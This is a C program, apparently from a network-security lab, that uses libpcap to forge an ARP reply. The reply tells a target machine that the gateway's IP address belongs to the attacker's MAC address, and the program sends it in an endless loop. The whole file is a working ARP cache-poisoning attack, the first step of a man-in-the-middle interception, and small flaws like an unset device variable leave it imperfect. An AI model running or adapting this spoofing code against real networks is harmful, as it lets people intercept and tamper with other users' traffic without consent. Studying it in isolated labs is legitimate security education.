#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>

int main(int argc, char *argv[]){

	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[] = "port 23";	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr header;	/* The header that pcap gives us */
	const u_char *packet;		/* The actual arp_packet */
	//u_char arp_packet[43];

	int res;
// ARGV[1]
	if (pcap_lookupnet(argv[1], &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	printf("device: %s\n", argv[1]);


	//res = pcap_next_ex(handle, &header,&packet);


	
	/*broadcast */
   u_char arp_packet[43]={               
		/* 						ETHER PACKET    				       			 */
		0x54,0x88,0x0E,0x7F,0xC4,0x02,   /*Destination Mac : Target(VM_win10)    */ 
		0xe4,0x42,0xa6,0xa1,0xab,0x12,   /*Source Mac      : Attacker(VM_Ubuntu) */
		0x08, 0x06,				         /*Ether Type                			 */
		/*				  	   NOW ARP PACKET  									 */
		0x00, 0x01,						 /*Hardware Type 						 */
		0x08, 0x00,						 /*Protocol Type 						 */
		0x06,					         /*Hardware Size, Length      			 */ 
		0x04,					         /*Protocol Size			  			 */
		0x00, 0x02,				         /*Opcode, 2 is replay        			 */
		0xe4,0x42,0xa6,0xa1,0xab,0x12,   /*Sender MAC      : Attacker(VM_Ubuntu) */
		0xc0,0xa8,0x00,0x01,		     /*Sender IP (GW IP)		 			 */
		0x54,0x88,0x0E,0x7F,0xC4,0x02,   /*Target MAC      : Target(VM_win10)    */
		0xc0,0xa8,0x00,0x30				 /*Tartget IP      : Target              */
};


	int count=0;
	 while(1){
		pcap_sendpacket(handle,arp_packet,43);
		printf("%d",count++);
		printf("\r"); 	
	 }  
	
	pcap_close(handle);
	return(0);

}